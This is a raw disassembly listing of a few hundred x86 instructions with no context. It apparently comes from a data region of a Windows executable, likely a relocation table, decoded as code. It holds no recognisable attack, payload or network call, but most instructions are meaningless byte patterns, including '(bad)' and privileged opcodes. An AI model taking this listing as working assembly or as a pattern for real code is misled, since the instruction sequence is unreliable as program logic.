  40e1e5:	xor    DWORD PTR ss:[esi],0x36ac3690
  40e1ec:	iret   
  40e1ed:	ss test eax,0xc837b637
  40e1f3:	aaa    
  40e1f4:	shl    BYTE PTR [edi],1
  40e1f6:	dec    ebp
  40e1f7:	cmp    BYTE PTR [ebx+0x38],bh
  40e1fa:	adc    edi,DWORD PTR [ecx]
  40e1fc:	sbb    eax,0x61392a39
  40e201:	cmp    DWORD PTR [ebx+0x39],ebp
  40e204:	je     0x40e23f
  40e206:	cmp    DWORD PTR [ecx],0x39b83989
  40e20c:	ret    0xc939
  40e20f:	cmp    edx,ebx
  40e211:	cmp    DWORD PTR ds:0x9c3a133a,eax
  40e217:	cmp    ah,BYTE PTR [edx+edi*1+0x3b0c3af0]
  40e21e:	and    BYTE PTR [ebx],bh
  40e220:	cmp    esi,DWORD PTR es:[edx]
  40e223:	cmp    eax,DWORD PTR [ebx+0x3b]
  40e226:	jo     0x40e263
  40e228:	jp     0x40e265
  40e22a:	cmp    DWORD PTR [ebx],0x3ba83b92
  40e230:	fdivr  DWORD PTR [ebx]
  40e232:	hlt    
  40e233:	cmp    esi,DWORD PTR [esp+edi*1]
  40e236:	inc    ebp
  40e237:	cmp    al,0x51
  40e239:	cmp    al,0x79
  40e23b:	cmp    al,0xad
  40e23d:	cmp    al,0xb5
  40e23f:	cmp    al,0xbc
  40e241:	cmp    al,0xf9
  40e243:	cmp    al,0x7
  40e245:	cmp    eax,0x3d283d18
  40e24a:	jg     0x40e289
  40e24c:	mov    ds:0x3def3d,al
  40e251:	ds or  eax,0x553e303e
  40e257:	ds je  0x40e298
  40e25a:	cmp    BYTE PTR [esi],0xa0
  40e25d:	lods   eax,DWORD PTR ds:[esi]
  40e25f:	ds mov ebx,0xe03ed33e
  40e265:	sbb    BYTE PTR ds:[edi],bh
  40e268:	gs aas 
  40e26a:	xchg   BYTE PTR [edi],bh
  40e26c:	fistp  QWORD PTR [edi]
  40e26e:	out    dx,al
  40e26f:	aas    
  40e270:	add    BYTE PTR [eax+0x0],al
  40e273:	add    BYTE PTR [eax],al
  40e275:	add    DWORD PTR [eax],eax
  40e277:	add    BYTE PTR [edx],al
  40e279:	xor    BYTE PTR [esi],bh
  40e27b:	xor    BYTE PTR [ecx+0x3530e130],dh
  40e281:	xor    DWORD PTR [edx+0x31],eax
  40e284:	pop    edx
  40e285:	xor    DWORD PTR [esi+0x31],edi
  40e288:	mov    dh,BYTE PTR [ecx]
  40e28a:	sahf   
  40e28b:	xor    DWORD PTR [ebx-0x1fce38cf],ebp
  40e291:	xor    DWORD PTR [esi],eax
  40e293:	xor    dl,BYTE PTR [esi]
  40e295:	xor    ah,BYTE PTR ds:0x5c325032
  40e29b:	xor    ch,BYTE PTR [ebx+0x32]
  40e29e:	jnp    0x40e2d2
  40e2a0:	stos   DWORD PTR es:[edi],eax
  40e2a1:	xor    dh,BYTE PTR [ebp+0x3f32cc32]
  40e2a7:	xor    eax,DWORD PTR [edi+0x33]
  40e2aa:	push   ebx
  40e2ab:	xor    esi,DWORD PTR [ecx+0x33]
  40e2ae:	xor    BYTE PTR [ebx],0xbf
  40e2b1:	xor    ebp,DWORD PTR [edx+0x34]
  40e2b4:	jns    0x40e2ea
  40e2b6:	mov    esi,DWORD PTR [ebx+edx*4]
  40e2b9:	xor    al,0x0
  40e2bb:	xor    eax,0x357b352e
  40e2c0:	shl    BYTE PTR ds:0x362335d3,0x3f
  40e2c7:	ss dec edi
  40e2c9:	ss push ebp
  40e2cb:	ss popa 
  40e2cd:	ss jb  0x40e306
  40e2d0:	xor    DWORD PTR [esi],0xffffffb9
  40e2d3:	or     BYTE PTR ss:[edi],dh
  40e2d6:	adc    BYTE PTR [edi],dh
  40e2d8:	xor    al,0x37
  40e2da:	cmp    dh,BYTE PTR [edi]
  40e2dc:	inc    esi
  40e2dd:	aaa    
  40e2de:	push   edi
  40e2df:	aaa    
  40e2e0:	push   0xc2379f37
  40e2e5:	aaa    
  40e2e6:	adc    edi,DWORD PTR [eax]
  40e2e8:	cmp    BYTE PTR cs:[ebx],bh
  40e2eb:	cmp    BYTE PTR [edi+0x38],al
  40e2ee:	data16 cmp BYTE PTR [ebx-0x47c755c8],cl
  40e2f5:	cmp    dh,dl
  40e2f7:	cmp    bl,ah
  40e2f9:	cmp    BYTE PTR [ebx],al
  40e2fb:	cmp    DWORD PTR [eax],edx
  40e2fd:	cmp    DWORD PTR [eax+0x39],ecx
  40e300:	pop    esp
  40e301:	cmp    DWORD PTR [ecx+0x39],ebp
  40e304:	test   al,0x39
  40e306:	leave  
  40e307:	cmp    DWORD PTR [ebx],esp
  40e309:	cmp    dh,BYTE PTR [edx]
  40e30b:	cmp    al,BYTE PTR [esi+0x3a]
  40e30e:	cmp    BYTE PTR [edx],0xf5
  40e311:	cmp    al,BYTE PTR ds:0x2b3b1e3b
  40e317:	cmp    edi,DWORD PTR [esi]
  40e319:	cmp    esp,DWORD PTR [eax+0x3b]
  40e31c:	jo     0x40e359
  40e31e:	jg     0x40e35b
  40e320:	scas   al,BYTE PTR es:[edi]
  40e321:	cmp    edi,DWORD PTR [edx-0x26c436c5]
  40e327:	cmp    ecx,DWORD PTR [ecx]
  40e329:	cmp    al,0x13
  40e32b:	cmp    al,0x33
  40e32d:	cmp    al,0xa5
  40e32f:	cmp    al,0xaa
  40e331:	cmp    al,0xb6
  40e333:	cmp    al,0xd4
  40e335:	cmp    al,0xe3
  40e337:	cmp    al,0x1f
  40e339:	cmp    eax,0x3da93d71
  40e33e:	mov    bh,0x3d
  40e340:	aad    0x3d
  40e342:	fidivr WORD PTR ds:0x3e433df9
  40e348:	dec    esi
  40e349:	bound  edi,QWORD PTR ds:[esi]
  40e34c:	imul   edi,DWORD PTR [esi],0x76
  40e34f:	mov    ds:0xcc3eae3e,eax
  40e355:	ds aad 0x3e
  40e358:	add    eax,0x393f2b3f
  40e35d:	aas    
  40e35e:	push   esi
  40e35f:	aas    
  40e360:	pop    edi
  40e361:	aas    
  40e362:	jns    0x40e3a3
  40e364:	mov    ch,0x3f
  40e366:	sar    BYTE PTR [edi],0xdb
  40e369:	aas    
  40e36a:	in     al,0x3f
  40e36c:	out    dx,eax
  40e36d:	aas    
  40e36e:	add    BYTE PTR [eax],al
  40e370:	add    BYTE PTR [eax+0x0],dl
  40e373:	add    BYTE PTR [ecx+eax*1],ah
  40e376:	add    BYTE PTR [eax],al
  40e378:	or     BYTE PTR [eax],dh
  40e37a:	and    eax,0x41303230
  40e37f:	xor    BYTE PTR [eax+esi*1+0x5f],dl
  40e383:	xor    BYTE PTR [esi+0x30],ch
  40e386:	xor    DWORD PTR [eax],0x30c73096
  40e38c:	div    DWORD PTR [eax]
  40e38e:	push   DWORD PTR [eax]
  40e390:	or     al,0x31
  40e392:	sbb    dh,BYTE PTR [ecx]
  40e394:	xor    dh,BYTE PTR [ecx]
  40e396:	inc    ebp
  40e397:	xor    DWORD PTR [ebx+0x31],edx
  40e39a:	je     0x40e3cd
  40e39c:	mov    DWORD PTR [ecx],esi
  40e39e:	cwde   
  40e39f:	xor    DWORD PTR [esi-0x13ce27cf],esp
  40e3a5:	xor    DWORD PTR ds:0x44323732,ebx
  40e3ab:	xor    dh,BYTE PTR [edi+0x32]
  40e3ae:	mov    al,ds:0xe632d732
  40e3b3:	xor    ah,BYTE PTR [edx]
  40e3b5:	xor    edi,DWORD PTR [eax]
  40e3b7:	xor    eax,DWORD PTR [ebx+0x33]
  40e3ba:	ja     0x40e3ef
  40e3bc:	mov    al,ds:0x133dc33
  40e3c1:	xor    al,0x3a
  40e3c3:	xor    al,0x62
  40e3c5:	xor    al,0x84
  40e3c7:	xor    al,0x9d
  40e3c9:	xor    al,0xc7
  40e3cb:	xor    al,0xe1
  40e3cd:	xor    al,0xfe
  40e3cf:	xor    al,0x44
  40e3d1:	xor    eax,0x3555354b
  40e3d6:	addr16 xor eax,0x35a83598
  40e3dc:	mov    edx,0xf035c035
  40e3e1:	xor    eax,0x361035fb
  40e3e6:	sub    DWORD PTR [esi],esi
  40e3e8:	inc    edx
  40e3e9:	ss pop edi
  40e3eb:	ss push 0x36
  40e3ee:	test   BYTE PTR [esi],dh
  40e3f0:	popf   
  40e3f1:	ss mov ah,0x36
  40e3f4:	mov    ebp,0xcf36c936
  40e3f9:	ss jne 0x40e433
  40e3fc:	xor    BYTE PTR [edi],0x94
  40e3ff:	aaa    
  40e400:	mov    ah,0x37
  40e402:	aam    0x37
  40e404:	sti    
  40e405:	aaa    
  40e406:	sbb    edi,DWORD PTR [eax]
  40e408:	inc    esp
  40e409:	cmp    BYTE PTR [ebx+0x38],ah
  40e40c:	jnp    0x40e446
  40e40e:	cmp    DWORD PTR [eax],0x3893388d
  40e414:	call   0xac38:0xa638a038
  40e41b:	cmp    BYTE PTR [edx-0x32c73fc8],bh
  40e421:	cmp    bl,dl
  40e423:	cmp    cl,ch
  40e425:	cmp    bh,ch
  40e427:	cmp    BYTE PTR [esi],al
  40e429:	cmp    DWORD PTR [ecx+edi*1],ecx
  40e42c:	sub    edi,DWORD PTR [ecx]
  40e42e:	xor    DWORD PTR [ecx],edi
  40e430:	inc    ebp
  40e431:	cmp    DWORD PTR [ebx+0x39],ecx
  40e434:	cmp    DWORD PTR gs:[ebx+0x39],ebp
  40e438:	jae    0x40e473
  40e43a:	jns    0x40e475
  40e43c:	mov    al,ds:0xe039c639
  40e441:	cmp    ecx,ebp
  40e443:	cmp    DWORD PTR [ebp+0x3a],esi
  40e446:	xchg   esi,eax
  40e447:	cmp    dh,BYTE PTR [esi+0xf3ae23a]
  40e44d:	cmp    ebp,DWORD PTR [edx]
  40e44f:	cmp    edi,DWORD PTR [esi]
  40e451:	cmp    ebx,DWORD PTR [ecx+0x3b]
  40e454:	cmp    eax,DWORD PTR fs:[edi+0x403bed3b]
  40e45b:	cmp    al,0x49
  40e45d:	cmp    al,0x64
  40e45f:	cmp    al,0x7a
  40e461:	cmp    al,0x94
  40e463:	cmp    al,0xd2
  40e465:	cmp    al,0xdd
  40e467:	cmp    al,0x8
  40e469:	cmp    eax,0x3d523d28
  40e46e:	mov    DWORD PTR ds:0x3df53ddb,edi
  40e474:	push   cs
  40e475:	ds lea edi,ds:0x3e9a
  40e47c:	lods   al,BYTE PTR ds:[esi]
  40e47d:	ds mov esi,0xff3ef53e
  40e483:	ds pop ss
  40e485:	aas    
  40e486:	es aas 
  40e488:	xor    al,0x3f
  40e48a:	inc    esi
  40e48b:	aas    
  40e48c:	push   ecx
  40e48d:	aas    
  40e48e:	pop    esp
  40e48f:	aas    
  40e490:	data16 aas 
  40e492:	add    BYTE PTR [eax],al
  40e494:	add    BYTE PTR [eax+0x0],ah
  40e497:	add    BYTE PTR [eax+0x1],ah
  40e49a:	add    BYTE PTR [eax],al
  40e49c:	or     dh,BYTE PTR [eax]
  40e49e:	adc    esi,DWORD PTR [eax]
  40e4a0:	sub    eax,0x4b303c30
  40e4a5:	xor    BYTE PTR [edx+0x30],bl
  40e4a8:	je     0x40e4da
  40e4aa:	mov    ?,WORD PTR [eax]
  40e4ac:	lds    esi,FWORD PTR [eax]
  40e4ae:	xchg   DWORD PTR [ecx],esi
  40e4b0:	pushf  
  40e4b1:	xor    esp,edx
  40e4b3:	xor    DWORD PTR [ecx+0x32],ebx
  40e4b6:	arpl   WORD PTR [edx],si
  40e4b8:	push   0x32
  40e4ba:	je     0x40e4ee
  40e4bc:	test   al,0x32
  40e4be:	(bad)  
  40e4bf:	xor    bh,ch
  40e4c1:	xor    dl,BYTE PTR [ebx]
  40e4c3:	xor    ebx,DWORD PTR [ebx+esi*1]
  40e4c6:	push   edi
  40e4c7:	xor    esi,DWORD PTR [edx-0x39cc47cd]
  40e4cd:	xor    ecx,ebp
  40e4cf:	xor    edx,edx
  40e4d1:	xor    ebx,esp
  40e4d3:	xor    edi,edx
  40e4d5:	xor    ecx,DWORD PTR [eax]
  40e4d7:	xor    al,0x11
  40e4d9:	xor    al,0x1c
  40e4db:	xor    al,0x23
  40e4dd:	xor    al,0x2a
  40e4df:	xor    al,0x87
  40e4e1:	xor    al,0x91
  40e4e3:	xor    al,0xda
  40e4e5:	xor    al,0xe7
  40e4e7:	xor    al,0x1a
  40e4e9:	xor    eax,0x35383523
  40e4ee:	pop    eax
  40e4ef:	xor    eax,0x3579356e
  40e4f4:	xchg   DWORD PTR ds:0x35d035ac,esi
  40e4fa:	out    0x35,eax
  40e4fc:	out    dx,eax
  40e4fd:	xor    eax,0x36343611
  40e502:	cmp    esi,DWORD PTR [esi]
  40e504:	pop    esi
  40e505:	ss jp  0x40e53e
  40e508:	xchg   BYTE PTR [esi],dh
  40e50a:	(bad)  [esi]
  40e50c:	out    dx,eax
  40e50d:	ss getsec 
  40e510:	sub    DWORD PTR [edi],esi
  40e512:	xor    eax,0x94374c37
  40e517:	aaa    
  40e518:	fdiv   DWORD PTR [edi]
  40e51a:	sti    
  40e51b:	aaa    
  40e51c:	xor    eax,0x57383d38
  40e521:	cmp    BYTE PTR [edx+0x38],ah
  40e524:	imul   edi,DWORD PTR [eax],0x78
  40e527:	cmp    BYTE PTR [ebp-0x41c74dc8],ah
  40e52d:	cmp    al,dl
  40e52f:	cmp    dl,ah
  40e531:	cmp    ch,dh
  40e533:	cmp    BYTE PTR [eax],al
  40e535:	cmp    DWORD PTR [esi],ecx
  40e537:	cmp    DWORD PTR [ecx+edi*1],ebx
  40e53a:	cmp    DWORD PTR gs:[eax+0x39],edi
  40e53e:	cwde   
  40e53f:	cmp    DWORD PTR [esi-0x32c646c7],ebp
  40e545:	cmp    esp,esp
  40e547:	cmp    ebp,esi
  40e549:	cmp    DWORD PTR [ebx],edx
  40e54b:	cmp    ch,BYTE PTR [edx]
  40e54d:	cmp    bh,BYTE PTR [esi]
  40e54f:	cmp    dh,BYTE PTR [eax+0x3a]
  40e552:	cmp    BYTE PTR [edx],0x8b
  40e555:	cmp    bl,BYTE PTR [ebx-0x29c545c6]
  40e55b:	cmp    bl,ah
  40e55d:	cmp    cl,BYTE PTR [ecx]
  40e55f:	cmp    edx,DWORD PTR [eax]
  40e561:	cmp    edi,DWORD PTR [edi]
  40e563:	cmp    eax,DWORD PTR [esi+0x3b]
  40e566:	imul   edi,DWORD PTR [ebx],0x3b903b73
  40e56c:	xchg   edi,eax
  40e56d:	cmp    edi,DWORD PTR [edx-0x17c33ec4]
  40e573:	cmp    al,0xf4
  40e575:	cmp    al,0xfa
  40e577:	cmp    al,0x7
  40e579:	cmp    eax,0x3d263d1d
  40e57e:	xor    BYTE PTR ds:0x3d433d39,bh
  40e584:	dec    edi
  40e585:	cmp    eax,0x3d5c3d55
  40e58a:	gs cmp eax,0x3d733d6b
  40e590:	jns    0x40e5cf
  40e592:	xchg   BYTE PTR ds:0x3d943d8e,bh
  40e598:	mov    cl,0x3d
  40e59a:	mov    dh,0x3d
  40e59c:	mov    esp,0xc63dc13d
  40e5a1:	cmp    eax,0x3dd03dcb
  40e5a6:	(bad)  
  40e5a7:	cmp    eax,0x3deb3dde
  40e5ac:	add    eax,0x323e273e
  40e5b1:	ds inc esp
  40e5b3:	ds dec esp
  40e5b5:	ds push ecx
  40e5b7:	ds push esi
  40e5b9:	ds js  0x40e5fa
  40e5bc:	jle    0x40e5fc
  40e5be:	test   DWORD PTR [esi],edi
  40e5c0:	mov    bh,BYTE PTR [esi]
  40e5c2:	xchg   edi,eax
  40e5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5c5:	ds scas al,BYTE PTR es:[edi]
  40e5c7:	ds mov dh,0x3e
  40e5ca:	retf   0xd23e
  40e5cd:	fidivr DWORD PTR ds:[esi]
  40e5d0:	loopne 0x40e610
  40e5d2:	out    0x3e,al
  40e5d4:	repz ds stc 
  40e5d7:	add    edi,DWORD PTR ds:[edi]
  40e5da:	and    bh,BYTE PTR [edi]
  40e5dc:	sub    BYTE PTR [edi],bh
  40e5de:	xor    bh,BYTE PTR [edi]
  40e5e0:	cmp    BYTE PTR [edi],bh
  40e5e2:	inc    ecx
  40e5e3:	aas    
  40e5e4:	inc    esi
  40e5e5:	aas    
  40e5e6:	arpl   WORD PTR [edi],di
  40e5e8:	xchg   BYTE PTR [edi],bh
  40e5ea:	ret    0xde3f
  40e5ed:	aas    
  40e5ee:	out    0x3f,eax
  40e5f0:	repnz aas 
  40e5f2:	stc    
  40e5f3:	aas    
  40e5f4:	add    BYTE PTR [eax+0x0],dh
  40e5f7:	add    BYTE PTR [eax+eax*1+0x30100000],dl
  40e5fe:	push   ss
  40e5ff:	xor    BYTE PTR [eax+esi*1],bl
  40e602:	and    dh,BYTE PTR [eax]
  40e604:	sub    BYTE PTR [eax],dh
  40e606:	xor    BYTE PTR cs:0x43303c30,dh
  40e60d:	xor    BYTE PTR [edx+0x30],cl
  40e610:	push   ecx
  40e611:	xor    BYTE PTR [eax+0x30],bl
  40e614:	pop    edi
  40e615:	xor    BYTE PTR [edi+0x30],ah
  40e618:	outs   dx,DWORD PTR ds:[esi]
  40e619:	xor    BYTE PTR [edi+0x30],dh
  40e61c:	xor    DWORD PTR [eax],0xffffff8c
  40e61f:	xor    BYTE PTR [ecx-0x5ecf68d0],dl
  40e625:	xor    BYTE PTR [ebx-0x34cf44d0],ch
  40e62b:	xor    cl,dl
  40e62d:	xor    ah,bl
  40e62f:	xor    dl,ah
  40e631:	xor    dh,ch
  40e633:	xor    dh,bh
  40e635:	xor    BYTE PTR [edi],al
  40e637:	xor    DWORD PTR [ecx+0x31],ebx
  40e63a:	jno    0x40e66d
  40e63c:	ja     0x40e66f
  40e63e:	xchg   BYTE PTR [ecx],dh
  40e640:	xchg   edx,eax
  40e641:	xor    DWORD PTR [edi],eax
  40e643:	xor    bh,BYTE PTR [edx+esi*1]
  40e646:	test   al,0x32
  40e648:	lods   eax,DWORD PTR ds:[esi]
  40e649:	xor    bh,BYTE PTR [edi-0xecd22ce]
  40e64f:	xor    dh,bh
  40e651:	xor    bh,BYTE PTR [ecx-0x1fcc2bcd]
  40e657:	xor    ebp,edi
  40e659:	xor    edi,eax
  40e65b:	xor    eax,DWORD PTR [ecx]
  40e65d:	xor    al,0x16
  40e65f:	xor    al,0x2b
  40e661:	xor    al,0x38
  40e663:	xor    al,0x40
  40e665:	xor    al,0x64
  40e667:	xor    al,0x72
  40e669:	xor    al,0x7d
  40e66b:	xor    al,0x9a
  40e66d:	xor    al,0xf2
  40e66f:	xor    al,0xf7
  40e671:	xor    al,0x19
  40e673:	xor    eax,0x35783536
  40e678:	mov    al,ds:0xc438ac38
  40e67d:	cmp    al,cl
  40e67f:	cmp    ah,ah
  40e681:	cmp    al,ch
  40e683:	cmp    BYTE PTR [ecx+edi*1],al
  40e686:	or     BYTE PTR [ecx],bh
  40e688:	add    BYTE PTR [eax+0x340000],al
  40e68e:	add    BYTE PTR [eax],al
  40e690:	adc    al,0x30
  40e692:	sbb    al,0x30
  40e694:	and    al,0x30
  40e696:	sub    al,0x30
  40e698:	xor    al,0x30
  40e69a:	cmp    al,0x30
  40e69c:	inc    esp
  40e69d:	xor    BYTE PTR [eax+esi*1+0x54],cl
  40e6a1:	xor    BYTE PTR [eax+esi*1+0x64],bl
  40e6a5:	xor    BYTE PTR [eax+esi*1+0x74],ch
  40e6a9:	xor    BYTE PTR [eax+esi*1-0x7c],bh
  40e6ad:	xor    BYTE PTR [eax+esi*1+0x309c3094],cl
  40e6b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6b5:	xor    BYTE PTR [eax+esi*1+0x30bc30b4],ch
  40e6bc:	add    al,al
  40e6be:	add    BYTE PTR [eax],al
  40e6c0:	or     al,0x0
  40e6c2:	add    BYTE PTR [eax],al
  40e6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6c5:	xor    DWORD PTR [eax],eax
	...
